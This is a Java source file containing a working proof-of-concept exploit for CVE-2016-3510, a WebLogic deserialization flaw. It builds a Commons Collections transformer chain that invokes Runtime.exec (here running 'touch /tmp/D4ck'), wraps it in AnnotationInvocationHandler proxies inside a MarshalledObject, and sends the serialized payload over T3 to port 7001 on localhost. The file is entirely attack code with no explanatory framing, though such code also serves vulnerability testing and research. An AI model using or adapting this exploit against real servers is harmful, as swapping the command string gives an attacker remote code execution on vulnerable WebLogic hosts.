package main;

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import weblogic.corba.utils.MarshalledObject;
import weblogic.jms.common.StreamMessageImpl;
import weblogic.jms.common.TextMessageImpl;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class cve_2016_3510 {

    public Object getObject() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"touch /tmp/D4ck"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        final Map testMap = new HashMap();

        Map evilMap = (Map) Proxy.newProxyInstance(
                testMap.getClass().getClassLoader(),
                testMap.getClass().getInterfaces(),
                secondInvocationHandler
        );
        final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
        return handler;
    }
    public static void main(String[] args) throws Exception {
        Object obj = new cve_2016_3510().getObject();
        MarshalledObject textMessage = new MarshalledObject(obj);
        byte[] payload2 = Serializables.serialize(textMessage);
        T3ProtocolOperation.send("127.0.0.1", "7001", payload2);
    }
}
